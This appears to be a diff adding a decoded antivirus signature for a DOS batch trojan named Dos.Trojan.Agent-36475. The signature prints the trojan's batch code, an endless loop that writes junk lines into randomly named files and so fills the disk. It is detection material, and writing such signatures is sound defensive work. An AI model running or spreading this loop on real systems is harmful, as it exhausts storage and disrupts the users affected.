@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36475
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off :1 echo rundll32 mouse,disable >> %random% . %random% echo runll keyboard,disable >> %random% . %random% goto 1
